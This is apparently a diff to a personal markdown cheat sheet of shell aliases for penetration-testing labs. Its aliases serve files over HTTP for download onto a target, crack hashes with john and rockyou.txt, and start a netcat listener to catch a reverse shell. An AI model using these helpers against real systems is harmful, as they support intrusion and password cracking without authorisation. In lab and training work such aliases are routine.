@@ -1,7 +1,7 @@
 #find your public ip
-```shell
+```shellscript
 alias myip='curl ipinfo.io/ip'
-```
+
 #starts python web server on port 80 and prints the wget command to download any file in the current working directory
 alias lweb='ip=$(ip a s tun0 | grep -oP "(\d{2}\.){3}\d{1,2}") && for i in $(ls .); do echo "wget $ip/$i"; done; python3 -m http.server 80'
 
@@ -19,5 +19,5 @@ j () {john "$1" --wordlist=rockyou.txt}
 
 #start netcat listen to receive reverse shell. Usage: listen 'port'
 listen () {nc -nvlp "$1"}
-
+```
 
